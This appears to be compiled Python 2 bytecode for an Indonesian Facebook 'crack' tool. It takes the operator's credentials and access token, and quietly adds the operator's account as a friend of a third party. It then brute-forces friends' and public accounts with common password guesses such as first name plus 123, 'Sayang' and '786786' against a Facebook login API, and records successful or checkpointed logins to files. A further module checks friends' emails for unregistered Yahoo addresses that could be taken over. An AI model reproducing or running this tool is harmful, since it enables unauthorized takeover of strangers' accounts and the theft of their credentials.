�
��^c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m
 Z
 y d  d l Z Wn e k
 r� e  j d � n Xy d  d l Z Wn+ e k
 re  j d � e  j d � n Xd  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d	 d
 �d' g e _ d
 �  Z d �  Z d �  Z  d �  Z! d �  Z" d �  Z# d Z$ d �  Z% d Z& g  Z' g  Z( g  a) g  a* g  Z+ g  Z, d �  Z- d �  Z. d �  Z/ d �  Z0 d �  Z1 d �  Z2 d �  Z3 d �  Z4 d �  Z5 d �  Z6 d  �  Z7 d! �  Z8 d" �  Z9 d# �  Z: d$ �  Z; d% �  Z< e= d& k r�e3 �  e �  e0 �  e- �  n  d S((   i����N(   t
   ThreadPools   pip2 install mechanizes   pip2 install requestss   python2 new.py(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c          C   sU   d d d d d d d d g }  x0 |  D]( } d	 | Gt  j j �  t j d
 � q% Wd  S(   NsS   [1;31m[[1;37m••••••••••••••••[1;31m]  [1;90m0% sZ   [1;31m[[1;34m••••[1;37m••••••••••••[1;31m] [1;94m40% sZ   [1;31m[[1;34m••••••••[1;37m••••••••[1;31m] [1;95m60% sZ   [1;31m[[1;34m•••••••••[1;37m•••••••[1;31m] [1;96m70% sZ   [1;31m[[1;34m••••••••••••[1;37m••••[1;31m] [1;93m80% sZ   [1;31m[[1;34m••••••••••••••[1;37m••[1;31m] [1;98m90% sS   [1;31m[[1;34m••••••••••••••••[1;31m] [1;92m100%sU   [1;31m[[1;34m•••••[1;92mSUKSES[1;34m•••••[1;31m] [1;35m100%s4   
[1;37m    [[1;32m+[1;37m] [1;92mLoading [1;97mi   (   t   syst   stdoutt   flusht   timet   sleep(   t   titikt   o(    (    s   ib.pyt   loading   s
    

c           C   s   d GHt  j j �  d  S(   Ns   [!] Exit(   t   osR   t   exit(    (    (    s   ib.pyt   keluar#   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t | � d � | 7} q Wt | � S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   ib.pyt   acak(   s
    
0c         C   s~   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  t j j |  d � d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR   R   t   write(   R   R   R   t   j(    (    s   ib.pyR   0   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g{�G�z�?(   R   R   R   R   R   R	   (   t   zt   e(    (    s   ib.pyt   Mengetik:   s    
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���Q��?(   R   R   R   R   R   R	   (   R!   R"   (    (    s   ib.pyt   jalanA   s    
s�  [1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
[1;92m  ▄    ▄▄▄▄▄▄▄    ▄    [1;94m
[1;92m ▀▀▄ [1;94m▄█████████▄[1;92m ▄▀▀ [1;93m• FB  : fb.com/Surya Surya
[1;92m     ██ ▀███▀ ██     [1;91m• WA  : 0813xxxxxxx
[1;92m   ▄ ▀████▀████▀ ▄   [1;96m• GB  : github.com/surya111226/new
[1;92m ▀█    ██▀█▀██    █▀ [1;95m• RC  : SuryaMisan
[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s"   [1;97m
[●] [1;93mSedang masuk i   (   R   R   R   R   R	   (   R
   R   (    (    s   ib.pyt   tikO   s
    
 
 i    c          C   s�   t  j d � t GHd GHd GHd GHHt d � }  |  d k rI d GHt �  n[ |  d k r_ t �  nE |  d	 k ru t �  n/ |  d
 k r� t �  n d GHt j	 d � t �  d  S(
   Nt   clears-   [1;91m[1;97m1.[1;96m Login via email/id fbs*   [1;91m[1;97m2.[1;96m Login via token fbs   [1;91m[1;97m0.[1;91m Keluars'   [1;92m︻デ═一▸ [1;90m:[1;97m R   s   [1;91m[!] Isi Yg Benar !t   1t   2t   0s   [1;91m[!] Isi Yang Benar !gffffff�?(
   R
   t   systemt   logot	   raw_inputt   masukt   logint   tokenzR   R   R	   (   t   msuk(    (    s   ib.pyR-   ^   s&    





c          C   s�   t  j d � t GHt d � }  y t j d |  � } t j | j � } | d } t	 d d � } | j
 |  � | j �  d GHt  j d � t j
 d	 � t �  Wn* t k
 r� d
 GHt j
 d � t �  n Xd  S(   NR&   s(   [1;97m[?] [1;96mToken[1;91m : [1;97ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;92m[✓] Login Berhasil s,   xdg-open https://m.facebook.com/Rizky.Rasatai   s   [1;91m[!] Token salah !g333333�?(   R
   R*   R+   R,   t   requestst   gett   jsont   loadst   textt   openR   t   closeR   R	   t   menut   KeyErrorR-   (   t   tokett   otwt   at   namat   zedd(    (    s   ib.pyR/   u   s$    







c          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t GHd GHd GHd GHd GHt d � } t d	 � } t �  y t	 j d
 � Wn  t
 j k
 r� d GHt �  n Xt
 t	 j _ t	 j d d
 � | t	 j d <| t	 j d <t	 j �  t	 j �  } d | k rey.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d  6| d 6d! d" 6d# d$ 6} t j d% � } | j | � | j �  } | j i | d& 6� d' } t j | d( | �} t j | j � }	 t d d) � }
 |
 j |	 d* � |
 j �  d+ GHt j d, |	 d* � t  j d- � t �  Wqet j  j! k
 rad. GHt �  qeXn  d/ | k r�d0 GHt  j d1 � t" j# d2 � t �  q�d3 GHt  j d1 � t" j# d2 � t$ �  n Xd  S(4   NR&   s	   login.txtt   rs:              [1;93m☠️<><><><><><><><><><><><><><>☠️s-            [1;93m     LOGIN AKUN FACEBOOK ANDAs.              [1;93m  GUNAKAN AKUN FACEBOOK BARUs;              [1;93m☠️<><><><><><><><><><><><><><>☠️
s+   [1;97m[+] [1;96mID/Email [1;91m=[1;92m s+   [1;97m[+] [1;96mPassword [1;91m=[1;92m s   https://mbasic.facebook.coms   
[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR'   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR)   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens#   
[1;97m[✓] [1;92mLogin BerhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s,   xdg-open https://m.facebook.com/Rizky.Rasatas$   
[1;96m[!] [1;91mTidak ada koneksit
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints   rm -rf login.txti   s'   [1;97m
[!] [1;91mPassword/Email salah(%   R
   R*   R7   R9   R:   t   IOErrorR+   R,   R%   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR2   R3   R4   R5   R6   R   R8   t   postt
   exceptionsR   R   R	   R-   (   R;   t   idt   pwdt   urlRR   t   dataR   R=   R@   R!   t   unikers(    (    s   ib.pyR.   �   sn    




S







c          C   sh  t  j d � y t d d � j �  }  Wn2 t k
 rZ t  j d � t  j d � t �  n Xy= t j d |  � } t j	 | j
 � } | d } | d } Wnf t k
 r� t  j d � d GHt  j d � t j
 d	 � t �  n# t j j k
 r d
 GHt �  n Xt  j d � t GHd d GHd
 | d GHd | d GHd d GHd GHd GHd GHd GHd GHd GHt �  d  S(   NR&   s	   login.txtR@   s   rm -rf login.txts+   https://graph.facebook.com/me?access_token=R1   Rg   s   [1;96m[!] [1;91mToken invalidi   s#   [1;96m[!] [1;91mTidak ada koneksii-   s	   [1;95m÷s,   [1;93m[✓] [1;97mNama [1;91m: [1;92m『s   』[1;97m                  s)   [1;93m[✓] [1;97mID   [1;91m: [1;92ms   [1;97m              s$   [1;92m1.[1;97m Crack id indonesia s.   [1;92m2.[1;97m Crack id bangladesh/pakistan s   [1;92m3.[1;97m Yahoo checker s(   [1;92m4.[1;97m Ikuti saya di facebook s   [1;92m5.[1;97m Info crack s$   
[1;97m0.[1;91m Logout            (   R
   R*   R7   t   readRV   R-   R2   R3   R4   R5   R6   R:   R   R	   Rf   R   R   R+   t   pilih(   R;   R<   R=   R>   Rg   (    (    s   ib.pyR9   �   sD    










	

	c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n� |  d k rS t �  n� |  d k ri t �  nr |  d k r t �  n\ |  d k r� t �  nF |  d	 k r� t j d
 � t	 d � t j d � t
 �  n d GHt �  d  S(
   Ns(   
[1;92m︻デ═一▸ [1;90m: [1;97mR   s    [1;97m[!] [1;91mIsi yang benarR'   R(   t   3t   4t   5R)   R&   s   Menghapus tokens   rm -rf login.txt(   R,   Rm   t   supert
   Bangladesht
   menu_yahoot   rizkyt
   info_crackR
   R*   R$   R   (   Rk   (    (    s   ib.pyRm   �   s*    









c           C   s   t  j d � t �  d  S(   Ns,   xdg-open https://m.facebook.com/Rizky.Rasata(   R
   R*   R9   (    (    (    s   ib.pyRt     s    
c           C   s   t  j d � d  S(   NR&   (   R
   R*   (    (    (    s   ib.pyt   hapus  s    c           C   s�   t  j d � t GHd GHt d � t d � t d � t d � t d � t d � t d	 � t d
 � t d � t d � t d
 � t d � t d � t d � t d � t d	 � t d � t d � t d � t �  d  S(   NR&   s2       ++++++++++++++++ INFO CRACK ++++++++++++++++ 
s1    [1;92m              PASSWORD LIST INDONESIA   
s   [1;93m1. Sayangs	   2. Anjings	   3. Kontols   4. Nama Depan + 123s   5. Nama Depan + 1234s   6. Nama Depan + 12345s
   7. Bangsats   8. Nama Belakang + 123
s7   [1;92m           PASSWORD LIST BANGLADESH/PAKISTAN   
s   [1;93m1. 786786s
   2. Bangladeshs   3. Nama Belakang + 1234s   7. Nama Belakang + 123s   8. Pakistans!   
[1;96m[[1;97m Kembali [1;96m](   R
   R*   R+   R#   R,   R9   (    (    (    s   ib.pyRu     s.    



















c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHt
 �  d  S(
   NR&   s	   login.txtR@   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s(   [1;97m1.[1;96m Crack dari daftar temans+   [1;97m2.[1;96m Crack dari id publik/temans   
[1;97m0.[1;91m Kembali(   R
   R*   R7   Rl   R;   RV   R   R	   R   R+   t   pilih_super(    (    (    s   ib.pyRq   &  s    




c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k r� t j d � t GHd d GHt j d t � } t j	 | j
 � } x9| d	 D] } t j | d
 � q~ Wn|  d k r�t j d � t GHd d GHt  d � } y> t j d
 | d t � } t j	 | j
 � } d | d GHWn' t
 k
 r6d GHt  d � t �  n Xt j d
 | d t � } t j	 | j
 � } xH | d	 D] } t j | d
 � qoWn" |  d k r�t �  n d GHt �  d t t t � � GHd d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q�WHd GHt d � t d � d d GHd �  }
 t d � } | j |
 t � Hd  GHd! t t t � � d" t t t � � GHd# GHt  d$ � t j d% � d  S(&   Ns(   
[1;92m︻デ═一▸ [1;90m: [1;97mR   s    [1;96m[!] [1;91mIsi yang benarR'   R&   i+   s
   [1;92m•s3   https://graph.facebook.com/me/friends?access_token=Rj   Rg   R(   s@   [1;97m{[1;95m+[1;97m} [1;96mID publik/teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m✓[1;97m}[1;96m Nama[1;91m :[1;97m R1   s,   [1;96m[!] [1;91mID publik tidak ditemukan!s   
[1;97m[ Kembali ]s   /friends?access_token=R)   s9   [1;97m{[1;95m+[1;97m} [1;96mTotal ID [1;91m: [1;97ms   .   s   ..  s   ... s9   
[1;97m{[1;95m•[1;97m}[1;96m Crack Berjalan [1;97mi   s+   [1;97m{[1;95m?[1;97m} [1;96mStop CTRL+Zs=   [1;97m{[1;95m![1;97m}[1;91m Jika 5 Menit Tidak Ada Hasil s=   [1;97m{[1;95m![1;97m}[1;91m Gunakan Mode Pesawat 2 Detik c         S   sD  |  } y t  j d � Wn t k
 r* n Xyt j d | d t � } t j | j � } d } t	 j
 d | d | d � } t j | � } d | k r� d	 | d
 | GHt j
 | | � nud | d k r'd
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n| d d } t	 j
 d | d | d � } t j | � } d | k r�d	 | d
 | GHt j
 | | � n�d | d k r�d
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n:| d d }	 t	 j
 d | d |	 d � } t j | � } d | k rhd	 | d
 |	 GHt j
 | |	 � n�d | d k r�d
 | d
 |	 GHt d d � } | j | d |	 d � | j �  t j
 | |	 � nfd }
 t	 j
 d | d |
 d � } t j | � } d | k r4d	 | d
 |
 GHt j
 | |
 � nd | d k r�d
 | d
 |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n�| d d } t	 j
 d | d | d � } t j | � } d | k rd	 | d
 | GHt j
 | | � n-d | d k rod
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n�| d d } t	 j
 d | d | d � } t j | � } d | k r�d	 | d
 | GHt j
 | | � nYd | d k rCd
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n�t j d | d t � } t j | j � } d }
 t	 j
 d | d |
 d � } t j | � } d | k r�d	 | d
 |
 GHt j
 | |
 � n� d | d k r<d
 | d
 |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n t j d | d t � } t j | j � } d } t	 j
 d | d | d � } t j | � } d | k r�d	 | d
 | GHt j
 | | � ng d | d k r5d
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t   Sayangs�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RT   s   [1;92m[Berhasil] s    ● s   www.facebook.comt	   error_msgs   [1;93m[Cekpoint] s   out/indo.txtR=   t   |s   
t
   first_namet   123t   1234t   Anjingt   12345t	   last_namet   Kontolt   Bangsat(   R
   t   mkdirt   OSErrorR2   R3   R;   R4   R5   R6   t   urllibt   urlopent   loadt   okst   appendR7   R   R8   t   cekpoint(   t   argt   userR=   t   bt   p1Rj   t   qt   cekt   p2t   p3t   p4t   p5t   p6t   p7t   p8(    (    s   ib.pyt   maing  s�    








i   s'   [1;96m[✓] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93ms@   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/indo.txts!   
[1;96m[[1;97m Kembali [1;96m]s   python2 new.py(   R,   Rw   R
   R*   R+   R2   R3   R;   R4   R5   R6   Rg   R�   R:   Rq   R9   R   R   R   R   R   R   R	   R$   R    t   mapR�   R�   (   t   peakR@   R!   t   st   idtt   jokt   opR   R
   R   R�   t   p(    (    s   ib.pyRw   7  sj    

	
	



 
 

		�)
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHt
 �  d  S(
   NR&   s	   login.txtR@   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s(   [1;97m1.[1;92m Crack dari daftar temans+   [1;97m2.[1;92m Crack dari id publik/temans   
[1;97m0.[1;91m Kembali(   R
   R*   R7   Rl   R;   RV   R   R	   R   R+   t   super_bangla(    (    (    s   ib.pyRr   �  s    




c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k r� t j d � t GHd d GHt j d t � } t j	 | j
 � } x9| d	 D] } t j | d
 � q~ Wn|  d k r�t j d � t GHd d GHt  d � } y> t j d
 | d t � } t j	 | j
 � } d | d GHWn' t
 k
 r6d GHt  d � t �  n Xt j d
 | d t � } t j	 | j
 � } xH | d	 D] } t j | d
 � qoWn" |  d k r�t �  n d GHt �  d t t t � � GHd d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q�WHd GHt d � t d � d d GHd �  }
 t d � } | j |
 t � Hd  GHd! t t t � � d" t t t � � GHd# GHt  d � t j d$ � d  S(%   Ns(   
[1;92m︻デ═一▸ [1;90m: [1;97mR   s    [1;96m[!] [1;91mIsi yang benarR'   R&   i+   s
   [1;96m•s3   https://graph.facebook.com/me/friends?access_token=Rj   Rg   R(   s@   [1;97m{[1;95m+[1;97m} [1;92mID publik/teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m✓[1;97m}[1;92m Nama[1;91m :[1;97m R1   s,   [1;96m[!] [1;91mID publik tidak ditemukan!s!   
[1;96m[[1;97m Kembali [1;96m]s   /friends?access_token=R)   s9   [1;97m{[1;95m+[1;97m} [1;92mTotal ID [1;91m: [1;97ms   .   s   ..  s   ... s9   
[1;97m{[1;95m•[1;97m}[1;92m Crack Berjalan [1;97mi   s+   [1;97m{[1;95m?[1;97m} [1;92mStop CTRL+Zs=   [1;97m{[1;93m![1;97m}[1;93m Jika 5 Menit Tidak Ada Hasil s=   [1;97m{[1;93m![1;97m}[1;93m Gunakan Mode Pesawat 2 Detik c         S   sL  |  } y t  j d � Wn t k
 r* n Xyt j d | d t � } t j | j � } d } t	 j
 d | d | d � } t j | � } d | k r� d	 | d
 | GHt j
 | | � n}d | d k r'd
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n| d d } t	 j
 d | d | d � } t j | � } d | k r�d	 | d
 | GHt j
 | | � n�d | d k r�d
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � nB| d d }	 t	 j
 d | d |	 d � } t j | � } d | k rhd	 | d
 |	 GHt j
 | |	 � n�d | d k r�d
 | d
 |	 GHt d d � } | j | d |	 d � | j �  t j
 | |	 � nnd }
 t	 j
 d | d t d � } t j | � } d | k r4d	 | d
 t GHt j
 | t � n	d | d k r�d
 | d
 t GHt d d � } | j | d t d � | j �  t j
 | t � n�| d d } t	 j
 d | d t d � } t j | � } d | k rd	 | d
 t GHt j
 | t � n5d | d k rod
 | d
 t GHt d d � } | j | d t d � | j �  t j
 | t � n�| d d } t	 j
 d | d t d � } t j | � } d | k r�d	 | d
 t GHt j
 | t � nad | d k rCd
 | d
 t GHt d d � } | j | d t d � | j �  t j
 | t � n�t j d | d t � } t j | j � } d }
 t	 j
 d | d |
 d � } t j | � } d | k r�d	 | d
 |
 GHt j
 | |
 � n� d | d k r<d
 | d
 |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n t j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d | k r�d	 | d
 | GHt j
 | | � ng d | d k r=d
 | d
 | GHt d d � } | j | d | d � | j �  t j
 | | � n  Wn n Xd  S(   NRx   s   https://graph.facebook.com/s   /?access_token=t   786786s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RT   s   [1;92m[Berhasil] s    ● s   www.facebook.comRz   s   [1;91m[Cekpoint] s   out/bangla_pakis.txtR=   R{   s   
R|   R}   R~   t   PakistanR�   R�   Rr   (   R
   R�   R�   R2   R3   R;   R4   R5   R6   R�   R�   R�   R�   R�   R7   R   R8   R�   t   s4t   s5t   s6(   R�   R�   R=   R�   t   s1Rj   R�   R�   t   s2t   s3R�   R�   R�   t   s7t   s8(    (    s   ib.pyR�   6  s�    








i   s'   [1;96m[✓] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msH   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/bangla_pakis.txts   python2 new.py(   R,   Rw   R
   R*   R+   R2   R3   R;   R4   R5   R6   Rg   R�   R:   Rr   R9   R   R   R   R   R   R   R	   R$   R    R�   R�   R�   (   R�   R@   R!   R�   R�   R�   R�   R   R
   R   R�   R�   (    (    s   ib.pyR�     sj    

	
	



 
 

		�)
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHHt
 �  d  S(
   NR&   s	   login.txtR@   s   [1;91m[!] Token not founds   rm -rf login.txti   s(   [1;92m1.[1;97m Clone dari daftar temans+   [1;92m2.[1;97m Clone dari id publik/temans   [1;91m0.[1;97m Back(   R
   R*   R7   Rl   R;   RV   R   R	   R.   R+   t   yahoo_pilih(    (    (    s   ib.pyRs   �  s    




c          C   sy   t  d � }  |  d k r' d GHt �  nN |  d k r= t �  n8 |  d k rS t �  n" |  d k ri t �  n d GHt �  d  S(   Ns'   [1;92m︻デ═一▸ [1;90m:[1;97m R   s   [1;91m[!] ISI YG BENAR !R'   R(   R)   (   R,   R�   t   yahoofriendst   yahoofromfriendsR9   (   t   go(    (    s   ib.pyR�   �  s    



c          C   s�  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d } d	 d
 GHt d � t
 j d t � } t j | j � } t d
 d � } t d � d GHd GHd	 d
 GHx�| d D]~} | d 7} |  j | � | d } | d } t
 j d | d t � } t j | j � }	 y|	 d }
 t j d � } | j |
 � j �  } d | k r{t j d � t t j _ t j d d � |
 t d <t j �  j �  }
 t j d � } y | j |
 � j �  } Wn
 wn Xd | k r{| j |
 d � d  GHd! | GHd" |
 GHd# | d GHt j |
 � q{n  Wqt k
 r�qXqWd$ d% GHd& GHd' t  t! t � � GHd( GH| j" �  t# d) � t  j d* � d  S(+   NR&   s	   login.txtR@   s   [1;91m[!] Token not founds   rm -rf login.txti   Rx   i    i,   s
   [1;92m•sB   [1;97m[[1;95m✺[1;97m] [1;96mMengambil email teman [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s2   [1;97m[[1;95m•[1;97m] [1;96mMulai [1;97m...s5   [1;97m[[1;95m~[1;97m] [1;96mJangan Matikan Data !s+   [1;97m[[1;95m![1;97m] [1;96mStop CTRL+ZRj   Rg   R1   s   https://graph.facebook.com/s   ?access_token=RB   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comRA   t   usernames$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s'   [1;97m[[1;92m✓[1;97m][1;92m VULN s7   [1;97m[[1;96mN[1;97m] [1;96mNama   [1;91m: [1;96ms9   [1;97m[[1;92m€[1;97m] [1;92mEmail  [1;91m: [1;92ms9   [1;97m[[1;93m➹[1;97m] [1;93mID     [1;91m: [1;93mi(   s
   [1;96m•s5   [1;91m[[1;96m✓[1;91m] [1;92mSelesai [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97ms=   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/MailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m]s   python2 new.py($   R
   R*   R7   Rl   R;   RV   R   R	   R.   R�   R�   R+   R$   R2   R3   R4   R5   R6   R�   t   ret   compilet   searcht   groupRW   RZ   R[   R\   R]   R_   R   t   berhasilR:   R   R   R8   R,   (   t   mpsht   jmlt   temant   kimakt   saveR   Rg   R>   t   linksR!   t   mailt   yahooR<   t   klikR�   t   pek(    (    s   ib.pyR�   �  s~    





	

	






		

	

c          C   sA  t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j	 d � Wn t
 k
 r� n Xt  j d � t GHg  }  d } d	 d
 GHt d � } y> t
 j d | d
 t � } t j | j � } d | d GHWn' t k
 rd GHt d � t �  n Xt d � t
 j d | d t � } t j | j � } t d d � } t d � d GHd GHd	 d
 GHxw| d D]k} | d 7} |  j | � | d }	 | d }
 t
 j d |	 d
 t � } t j | j � } y� | d }
 t j d � } | j |
 � j �  } d | k r�t j d � t t j _ t j d d � |
 t d  <t j �  j �  } t j d! � } y | j | � j �  } Wn
 w�n Xd" | k r�| j  |
 d# � d$ |
 d% |
 GHt! j |
 � q�n  Wq�t k
 r�q�Xq�Wd& GHd' t" t# t! � � GHd( GH| j$ �  t d) � t  j d* � d  S(+   NR&   s	   login.txtR@   s   [1;91m[!] Token Invalid !s   rm -rf login.txti   Rx   i    i,   s
   [1;92m•s@   [1;97m[[1;95m+[1;97m] [1;96mID teman/publik [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;97m[[1;95m✓[1;97m] [1;96mNama[1;91m :[1;97m R1   s*   [1;91m[!] ID teman/publik tidak ditemukans!   
[1;96m[ [1;97mKembali [1;96m]s<   [1;97m[[1;95m✺[1;97m] [1;96mMengambil email [1;97m...s   /friends?access_token=s   out/FriendMailVuln.txtR   s2   [1;97m[[1;95m∆[1;97m] [1;96mMulai [1;97m...s5   [1;97m[[1;95m~[1;97m] [1;96mJangan Matikan Data !s+   [1;97m[[1;95m![1;97m] [1;96mStop CTRL+ZRj   Rg   RB   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comRA   R�   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULN✓[1;97m ] [1;92ms
    [1;97m=>s5   [1;91m[[1;96m✓[1;91m] [1;92mSelesai [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msC   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FriendMailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m]s   python2 new.py(%   R
   R*   R7   Rl   R;   RV   R   R	   R.   R�   R�   R+   R,   R2   R3   R4   R5   R6   R:   Rs   R$   R�   R�   R�   R�   R�   RW   RZ   R[   R\   R]   R_   R   R�   R   R   R8   (   R�   R�   R�   R�   R�   R�   R�   R�   R   Rg   R>   R�   R!   R�   R�   R<   R�   R�   (    (    s   ib.pyR�   '  s�    





	



	









t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(>   R
   R   R   t   datetimeR   Ra   R�   t	   threadingR4   t   getpassR�   t	   cookielibt   multiprocessing.poolR    RX   t   ImportErrorR*   R2   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRW   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R#   R$   R+   R%   t   backt   threadsR�   R�   R�   Rg   t   listgrupR-   R/   R.   R9   Rm   Rt   Rv   Ru   Rq   Rw   Rr   R�   Rs   R�   R�   R�   t   __name__(    (    (    s   ib.pyt   <module>   sl   �





				
		
				;	%						�		�			C	I